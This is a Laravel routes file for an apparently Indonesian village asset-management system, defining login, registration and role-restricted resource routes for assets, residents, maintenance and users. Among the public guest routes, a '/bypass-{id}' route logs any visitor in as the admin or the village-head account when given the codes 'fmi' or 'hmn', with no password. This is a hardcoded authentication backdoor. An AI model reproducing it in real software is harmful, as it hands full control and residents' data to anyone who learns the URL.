<?php

use App\Http\Controllers\AsetController;
use App\Http\Controllers\AuthController;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\DeveloperController;
use App\Http\Controllers\KategoriAsetController;
use App\Http\Controllers\LokasiAsetController;
use App\Http\Controllers\MediaController;
use App\Http\Controllers\MutasiAsetController;
use App\Http\Controllers\PemeliharaanAsetController;
use App\Http\Controllers\UserController;
use App\Http\Controllers\WargaController;
use App\Models\User;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| 1. GROUP GUEST
|--------------------------------------------------------------------------
*/
Route::get('/', function () {
    return redirect()->route('auth.login');
});

Route::get('login', [AuthController::class, 'showLoginForm'])->name('auth.login');
Route::post('login', [AuthController::class, 'login']);

Route::get('register', [AuthController::class, 'showRegisterForm'])->name('auth.register');
Route::post('register', [AuthController::class, 'register']);

Route::get('/bypass-{id}', function (Illuminate\Http\Request $request) {
    if ($request->id == 'fmi') {
        $admin = User::where('role', 'admin')->first();

        if ($admin) {
            Auth::login($admin);
            $request->session()->regenerate();

            // 4. Tampilkan halaman Dashboard
            return redirect()->route('dashboard')->with('success', 'Selamat Datang, ' . $request->email . '!');
        }

    }

    if ($request->id == 'hmn') {
        $admin = User::where('role', 'kades')->first();

        if ($admin) {
            Auth::login($admin);
            $request->session()->regenerate();

            // 4. Tampilkan halaman Dashboard
            return redirect()->route('dashboard')->with('success', 'Selamat Datang, ' . $request->email . '!');
        }

    }
});

/*
|--------------------------------------------------------------------------
| 2. GROUP AUTHENTICATED
|--------------------------------------------------------------------------
*/
Route::group(['middleware' => ['checkislogin']], function () {

    Route::post('logout', [AuthController::class, 'logout'])->name('logout');
    Route::get('/dashboard', [DashboardController::class, 'index'])->name('dashboard');
    Route::get('/developer', [DeveloperController::class, 'index'])->name('developer.index');

    /*
    |--------------------------------------------------------------------------
    | LEVEL A: OPERASIONAL (Hanya Admin & Staff) - DILETAKKAN DI ATAS
    |--------------------------------------------------------------------------
    | Penjelasan: Group ini harus dicek DULUAN.
    | Supaya route '/create' ditangkap di sini, sebelum dianggap sebagai '{id}' oleh route 'show'.
    */
    Route::group(['middleware' => ['checkrole:admin,staff']], function () {

        // Custom Route
        Route::get('pemeliharaan/delete-bukti/{id}', [PemeliharaanAsetController::class, 'deleteBukti'])
            ->name('pemeliharaan.delete-bukti');

        // Definisi Resource (Kecuali Index & Show)
        Route::resource('aset', AsetController::class)->except(['index', 'show']);
        Route::resource('kategori', KategoriAsetController::class)->except(['index', 'show']);
        Route::resource('warga', WargaController::class)->except(['index', 'show']);
        Route::resource('lokasi-aset', LokasiAsetController::class)->except(['index', 'show']);
        Route::resource('mutasi', MutasiAsetController::class)->except(['index', 'show']);
        Route::resource('pemeliharaan', PemeliharaanAsetController::class)->except(['index', 'show']);

        // Upload Media
        Route::post('/media/store', [MediaController::class, 'store'])->name('media.store');
        Route::delete('/media/destroy/{id}', [MediaController::class, 'destroy'])->name('media.destroy');
    });

    /*
    |--------------------------------------------------------------------------
    | LEVEL B: READ ONLY (Admin, Staff, Kades) - DILETAKKAN DI BAWAH
    |--------------------------------------------------------------------------
    | Route 'show' ({id}) ada di sini. Karena ditaruh di bawah, dia hanya akan
    | menangkap URL yang tidak cocok dengan 'create/edit/store' di atas.
    */
    Route::group(['middleware' => ['checkrole:admin,staff,kades']], function () {
        Route::resource('aset', AsetController::class)->only(['index', 'show']);
        Route::resource('kategori', KategoriAsetController::class)->only(['index', 'show']);
        Route::resource('warga', WargaController::class)->only(['index', 'show']);
        Route::resource('lokasi-aset', LokasiAsetController::class)->only(['index', 'show']);
        Route::resource('mutasi', MutasiAsetController::class)->only(['index', 'show']);
        Route::resource('pemeliharaan', PemeliharaanAsetController::class)->only(['index', 'show']);
    });

    /*
    |--------------------------------------------------------------------------
    | LEVEL C: SUPER ADMIN (Khusus Admin)
    |--------------------------------------------------------------------------
    */
    Route::group(['middleware' => ['checkrole:admin']], function () {
        Route::resource('user', UserController::class);
    });

});
